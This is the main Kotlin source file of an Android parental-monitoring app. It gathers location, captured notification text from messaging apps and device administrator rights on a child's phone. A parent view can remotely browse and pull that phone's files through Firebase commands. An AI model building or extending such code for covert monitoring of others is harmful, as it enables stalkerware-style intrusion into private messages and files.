package com.assisten.gestion

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.webkit.MimeTypeMap
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import coil.compose.AsyncImage
import com.assisten.gestion.ui.theme.GestionTheme
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

data class FileItem(
    val name: String, 
    val isDirectory: Boolean, 
    val path: String, 
    val thumbnail: String? = null
)

data class DeviceStatus(
    val battery: Int = 0,
    val isCharging: Boolean = false,
    val isScreenOn: Boolean = false,
    val lastSeen: Long = 0,
    val wifiName: String = "Desconocida",
    val model: String = "Desconocido",
    val location: String = "Desconocida",
    val deviceId: String = "",
    val customName: String = ""
)

data class NotificationLog(
    val app: String = "",
    val title: String = "",
    val text: String = "",
    val timestamp: Long = 0
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            GestionTheme {
                MainScreen()
            }
        }
    }
}

@Composable
fun MainScreen() {
    var roleSelected by remember { mutableStateOf<String?>(null) }
    var viewingExplorerByChildId by remember { mutableStateOf<String?>(null) }
    var viewingNotifsByChildId by remember { mutableStateOf<String?>(null) }
    val context = LocalContext.current

    val storagePermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (!isGranted) {
            Toast.makeText(context, "Permiso necesario para monitoreo", Toast.LENGTH_SHORT).show()
        }
    }

    val locationPermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val fineLocationGranted = permissions.getOrDefault(Manifest.permission.ACCESS_FINE_LOCATION, false)
        val coarseLocationGranted = permissions.getOrDefault(Manifest.permission.ACCESS_COARSE_LOCATION, false)
        if (!fineLocationGranted && !coarseLocationGranted) {
            Toast.makeText(context, "Permiso de ubicación necesario", Toast.LENGTH_SHORT).show()
        }
    }

    Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
        Column(
            modifier = Modifier
                .padding(innerPadding)
                .fillMaxSize()
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            if (roleSelected == null) {
                Text(text = "Gestión Parental", fontSize = 24.sp, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.height(32.dp))

                Button(onClick = { roleSelected = "Padre" }, modifier = Modifier.fillMaxWidth()) {
                    Text("MODO PADRE (Control)")
                }

                Spacer(modifier = Modifier.height(16.dp))

                Button(
                    onClick = {
                        roleSelected = "Hijo"
                        checkAndRequestStoragePermissions(context) {
                            storagePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                        }
                        
                        locationPermissionLauncher.launch(arrayOf(
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_COARSE_LOCATION
                        ))

                        // Solicitar permiso de notificaciones (Listener)
                        if (!isNotificationServiceEnabled(context)) {
                            context.startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
                        }

                        val serviceIntent = Intent(context, MonitoringService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            context.startForegroundService(serviceIntent)
                        } else {
                            context.startService(serviceIntent)
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary)
                ) {
                    Text("MODO HIJO (Monitoreado)")
                }
            } else if (viewingExplorerByChildId != null) {
                RemoteFileExplorerScreen(childId = viewingExplorerByChildId!!, onBack = { viewingExplorerByChildId = null })
            } else if (viewingNotifsByChildId != null) {
                NotificationsLogScreen(childId = viewingNotifsByChildId!!, onBack = { viewingNotifsByChildId = null })
            } else {
                Dashboard(
                    role = roleSelected!!,
                    onOpenExplorer = { id -> viewingExplorerByChildId = id },
                    onOpenNotifs = { id -> viewingNotifsByChildId = id },
                    onBack = { roleSelected = null }
                )
            }
        }
    }
}

fun isNotificationServiceEnabled(context: Context): Boolean {
    val pkgName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat != null && flat.contains(pkgName)
}

private fun checkAndRequestStoragePermissions(context: Context, requestLegacy: () -> Unit) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        if (!Environment.isExternalStorageManager()) {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
            }
            context.startActivity(intent)
        }
    } else {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) != ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            // This was a bit redundant, let's simplify
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestLegacy()
        }
    }
}

@Composable
fun Dashboard(role: String, onOpenExplorer: (String) -> Unit, onOpenNotifs: (String) -> Unit, onBack: () -> Unit) {
    val context = LocalContext.current
    val database = FirebaseDatabase.getInstance().reference
    var devicesList by remember { mutableStateOf<List<DeviceStatus>>(emptyList()) }
    var showNameDialog by remember { mutableStateOf(false) }
    val sharedPrefs = remember { context.getSharedPreferences("GestionPrefs", Context.MODE_PRIVATE) }
    var currentChildName by remember { mutableStateOf(sharedPrefs.getString("child_name", "") ?: "") }

    LaunchedEffect(Unit) {
        if (role == "Padre") {
            database.child("status").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<DeviceStatus>()
                    snapshot.children.forEach { child ->
                        val dev = child.getValue(DeviceStatus::class.java)
                        if (dev != null) {
                            list.add(dev.copy(deviceId = child.key ?: ""))
                        }
                    }
                    devicesList = list
                }
                override fun onCancelled(error: DatabaseError) {}
            })
            
            // Limpieza de notificaciones viejas (72h)
            val threshold = System.currentTimeMillis() - (72 * 60 * 60 * 1000)
            database.child("notifs").get().addOnSuccessListener { snapshot ->
                snapshot.children.forEach { deviceNotifs ->
                    deviceNotifs.children.forEach { notif ->
                        val ts = notif.child("timestamp").getValue(Long::class.java) ?: 0
                        if (ts < threshold) notif.ref.removeValue()
                    }
                }
            }
        } else if (role == "Hijo" && currentChildName.isEmpty()) {
            showNameDialog = true
        }
    }

    if (showNameDialog) {
        var tempName by remember { mutableStateOf("") }
        AlertDialog(
            onDismissRequest = { },
            title = { Text("Identificar Dispositivo") },
            text = {
                Column {
                    Text("Ingresa un nombre para este celular (ej: Juan, Tablet, etc.)")
                    Spacer(Modifier.height(8.dp))
                    TextField(value = tempName, onValueChange = { tempName = it }, placeholder = { Text("Nombre del hijo") })
                }
            },
            confirmButton = {
                Button(onClick = {
                    if (tempName.isNotBlank()) {
                        sharedPrefs.edit().putString("child_name", tempName).apply()
                        currentChildName = tempName
                        showNameDialog = false
                        // Actualizar inmediatamente en Firebase
                        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                        database.child("status").child(deviceId).child("customName").setValue(tempName)
                    }
                }) { Text("Guardar") }
            }
        )
    }

    Column(modifier = Modifier.fillMaxSize(), horizontalAlignment = Alignment.CenterHorizontally) {
        Text(text = "Panel: $role", fontSize = 20.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(16.dp))
        
        if (role == "Hijo") {
            Card(modifier = Modifier.fillMaxWidth().padding(16.dp), colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)) {
                Column(Modifier.padding(16.dp)) {
                    Text("Dispositivo: $currentChildName", fontWeight = FontWeight.Bold, fontSize = 18.sp)
                    Text("Estado: Monitoreo Activo")
                    Spacer(modifier = Modifier.height(16.dp))
                    Button(
                        onClick = { requestDeviceAdmin(context) },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                    ) {
                        Icon(Icons.Default.Shield, contentDescription = null)
                        Spacer(Modifier.width(8.dp))
                        Text("Activar Administrador")
                    }
                    TextButton(onClick = { showNameDialog = true }, modifier = Modifier.align(Alignment.End)) {
                        Text("Cambiar nombre")
                    }
                }
            }
        } else {
            // Lista de dispositivos para el Padre
            if (devicesList.isEmpty()) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No hay dispositivos vinculados", color = Color.Gray)
                }
            } else {
                LazyColumn(modifier = Modifier.fillMaxSize()) {
                    items(devicesList) { device ->
                        DeviceCard(device, onOpenExplorer = { onOpenExplorer(device.deviceId) }, onOpenNotifs = { onOpenNotifs(device.deviceId) })
                    }
                }
            }
        }
        Spacer(modifier = Modifier.weight(1f))
        TextButton(onClick = onBack) { Text("Cerrar Sesión") }
    }
}

@Composable
fun DeviceCard(device: DeviceStatus, onOpenExplorer: () -> Unit, onOpenNotifs: () -> Unit) {
    Card(modifier = Modifier.fillMaxWidth().padding(8.dp)) {
        Column(Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text(text = device.customName.ifBlank { "Sin nombre" }, fontWeight = FontWeight.Bold, fontSize = 18.sp)
                    Text(text = device.model, fontSize = 12.sp, color = Color.Gray)
                }
                LiveStatusCard(device)
            }
            Spacer(Modifier.height(8.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                Button(onClick = onOpenExplorer, modifier = Modifier.weight(1f).padding(4.dp)) { 
                    Icon(Icons.Default.Folder, null, modifier = Modifier.size(18.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Archivos", fontSize = 12.sp) 
                }
                Button(onClick = onOpenNotifs, modifier = Modifier.weight(1f).padding(4.dp), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary)) { 
                    Icon(Icons.Default.Notifications, null, modifier = Modifier.size(18.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Mensajes", fontSize = 12.sp) 
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationsLogScreen(childId: String, onBack: () -> Unit) {
    val database = FirebaseDatabase.getInstance().reference
    var notifsList by remember { mutableStateOf<List<NotificationLog>>(emptyList()) }

    LaunchedEffect(childId) {
        database.child("notifs").child(childId).orderByChild("timestamp").limitToLast(100)
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<NotificationLog>()
                    snapshot.children.forEach { child ->
                        val n = child.getValue(NotificationLog::class.java)
                        if (n != null) list.add(n)
                    }
                    notifsList = list.reversed()
                }
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    Scaffold(
        topBar = { TopAppBar(title = { Text("Log de Mensajes") }, navigationIcon = { IconButton(onClick = onBack) { Icon(Icons.Default.ArrowBack, null) } }) }
    ) { padding ->
        if (notifsList.isEmpty()) {
            Box(Modifier.fillMaxSize().padding(padding), contentAlignment = Alignment.Center) {
                Text("Aún no hay mensajes registrados", color = Color.Gray)
            }
        } else {
            LazyColumn(Modifier.padding(padding).fillMaxSize()) {
                items(notifsList) { notif ->
                    val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date(notif.timestamp))
                    ListItem(
                        headlineContent = { Text(notif.title) },
                        supportingContent = { Text(notif.text) },
                        overlineContent = { Text("${notif.app.split(".").last().uppercase()} - $time") },
                        leadingContent = { 
                            Icon(
                                imageVector = when {
                                    notif.app.contains("whatsapp") -> Icons.Default.Chat
                                    notif.app.contains("instagram") -> Icons.Default.CameraAlt
                                    else -> Icons.Default.Message
                                },
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.primary
                            )
                        }
                    )
                    Divider(
                        modifier = Modifier.padding(horizontal = 16.dp),
                        color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.5f)
                    )
                }
            }
        }
    }
}

@Composable
fun LiveStatusCard(status: DeviceStatus) {
    val isOnline = System.currentTimeMillis() - status.lastSeen < 60000 
    Row(verticalAlignment = Alignment.CenterVertically) {
        Box(modifier = Modifier.size(10.dp).clip(CircleShape).background(if (isOnline) Color.Green else Color.Gray))
        Spacer(Modifier.width(6.dp))
        Text(text = "${status.battery}%", fontSize = 12.sp, fontWeight = FontWeight.Bold)
        if (status.isCharging) Icon(Icons.Default.ElectricBolt, null, modifier = Modifier.size(14.dp), tint = Color.Yellow)
    }
}

private fun requestDeviceAdmin(context: Context) {
    val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    val adminComponent = ComponentName(context, AdminReceiver::class.java)

    if (!devicePolicyManager.isAdminActive(adminComponent)) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Se requiere permiso de administrador para la protección parental.")
        }
        context.startActivity(intent)
    } else {
        Toast.makeText(context, "Modo administrador activo.", Toast.LENGTH_SHORT).show()
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RemoteFileExplorerScreen(childId: String, onBack: () -> Unit) {
    val database = FirebaseDatabase.getInstance().reference
    val context = LocalContext.current
    var currentPath by remember { mutableStateOf("/storage/emulated/0") }
    var filesList by remember { mutableStateOf<List<FileItem>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var downloadingFile by remember { mutableStateOf<String?>(null) }
    var previewData by remember { mutableStateOf<Pair<String, String>?>(null) } // Pair(Name, URL)

    LaunchedEffect(currentPath) {
        isLoading = true
        database.child("commands").child(childId).setValue(mapOf(
            "type" to "GET_FILES",
            "path" to currentPath
        ))
    }

    DisposableEffect(Unit) {
        val filesListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val list = mutableListOf<FileItem>()
                snapshot.children.forEach { child ->
                    val name = child.child("name").getValue(String::class.java) ?: ""
                    val isDir = child.child("isDirectory").getValue(Boolean::class.java) ?: false
                    val path = child.child("path").getValue(String::class.java) ?: ""
                    val thumb = child.child("thumbnail").getValue(String::class.java)
                    list.add(FileItem(name, isDir, path, thumb))
                }
                filesList = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                isLoading = false
            }
            override fun onCancelled(error: DatabaseError) { isLoading = false }
        }

        val readyListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val url = snapshot.child("url").getValue(String::class.java)
                val name = snapshot.child("name").getValue(String::class.java)
                if (url != null && name != null && name == downloadingFile) {
                    downloadingFile = null
                    if (isImage(name)) {
                        previewData = Pair(name, url)
                    } else {
                        Toast.makeText(context, "Abriendo: $name", Toast.LENGTH_SHORT).show()
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        context.startActivity(intent)
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        }

        database.child("responses").child(childId).addValueEventListener(filesListener)
        database.child("file_ready").child(childId).addValueEventListener(readyListener)
        
        onDispose { 
            database.child("responses").child(childId).removeEventListener(filesListener)
            database.child("file_ready").child(childId).removeEventListener(readyListener)
        }
    }

    if (previewData != null) {
        FilePreviewDialog(
            name = previewData!!.first,
            url = previewData!!.second,
            onClose = { previewData = null }
        )
    }

    Column(modifier = Modifier.fillMaxSize()) {
        TopAppBar(
            title = { Text("Explorador: ${currentPath.split("/").last()}") },
            navigationIcon = {
                IconButton(onClick = {
                    if (currentPath != "/storage/emulated/0" && currentPath != "/") {
                        currentPath = File(currentPath).parent ?: "/storage/emulated/0"
                    } else {
                        onBack()
                    }
                }) { Icon(Icons.Default.ArrowBack, contentDescription = "Volver") }
            }
        )
        
        if (isLoading) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                CircularProgressIndicator()
            }
        } else {
            LazyColumn(modifier = Modifier.fillMaxSize()) {
                items(filesList) { file ->
                    FileListItem(file, file.name == downloadingFile) {
                        if (file.isDirectory) {
                            currentPath = file.path
                        } else {
                            downloadingFile = file.name
                            Toast.makeText(context, "Solicitando archivo...", Toast.LENGTH_SHORT).show()
                            database.child("commands").child(childId).setValue(mapOf(
                                "type" to "UPLOAD_FILE",
                                "path" to file.path
                            ))
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun FileListItem(file: FileItem, isDownloading: Boolean, onClick: () -> Unit) {
    Row(
        modifier = Modifier.fillMaxWidth().clickable { onClick() }.padding(12.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Box(modifier = Modifier.size(48.dp), contentAlignment = Alignment.Center) {
            if (isDownloading) {
                CircularProgressIndicator(modifier = Modifier.size(24.dp), strokeWidth = 2.dp)
            } else if (file.thumbnail != null) {
                val bitmap = remember(file.thumbnail) {
                    val decodedString = Base64.decode(file.thumbnail, Base64.DEFAULT)
                    BitmapFactory.decodeByteArray(decodedString, 0, decodedString.size)
                }
                Image(
                    bitmap = bitmap.asImageBitmap(),
                    contentDescription = null,
                    modifier = Modifier.fillMaxSize().clip(RoundedCornerShape(8.dp)),
                    contentScale = ContentScale.Crop
                )
            } else {
                Box(
                    modifier = Modifier.fillMaxSize().clip(RoundedCornerShape(8.dp)).background(MaterialTheme.colorScheme.surfaceVariant),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = when {
                            file.isDirectory -> Icons.Default.Folder
                            isImage(file.name) -> Icons.Default.Image
                            else -> Icons.Default.InsertDriveFile
                        },
                        contentDescription = null,
                        tint = if (file.isDirectory) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.outline
                    )
                }
            }
        }
        
        Spacer(modifier = Modifier.width(16.dp))
        Column {
            Text(text = file.name, fontWeight = FontWeight.Medium, maxLines = 1)
            Text(text = if (file.isDirectory) "Carpeta" else "Archivo", fontSize = 12.sp, color = MaterialTheme.colorScheme.outline)
        }
    }
}

@Composable
fun FilePreviewDialog(name: String, url: String, onClose: () -> Unit) {
    val context = LocalContext.current
    Dialog(onDismissRequest = onClose) {
        Card(
            modifier = Modifier.fillMaxWidth().padding(16.dp),
            shape = RoundedCornerShape(16.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(text = name, fontWeight = FontWeight.Bold, fontSize = 18.sp, maxLines = 1)
                Spacer(modifier = Modifier.height(16.dp))
                
                AsyncImage(
                    model = url,
                    contentDescription = null,
                    modifier = Modifier.fillMaxWidth().height(300.dp).clip(RoundedCornerShape(8.dp)),
                    contentScale = ContentScale.Fit
                )
                
                Spacer(modifier = Modifier.height(24.dp))
                
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                    TextButton(onClick = onClose) { Text("Cerrar") }
                    Button(onClick = {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        context.startActivity(intent)
                        onClose()
                    }) {
                        Text("Abrir Completo")
                    }
                }
            }
        }
    }
}

private fun isImage(name: String): Boolean {
    val lower = name.lowercase()
    return lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") || lower.endsWith(".webp")
}

@Suppress("unused")
private fun openFile(context: Context, file: File) {
    try {
        val uri: Uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
        val extension = MimeTypeMap.getFileExtensionFromUrl(file.absolutePath)
        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.lowercase()) ?: "*/*"

        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, mimeType)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    } catch (_: Exception) {
        Toast.makeText(context, "No se pudo abrir el archivo", Toast.LENGTH_SHORT).show()
    }
}
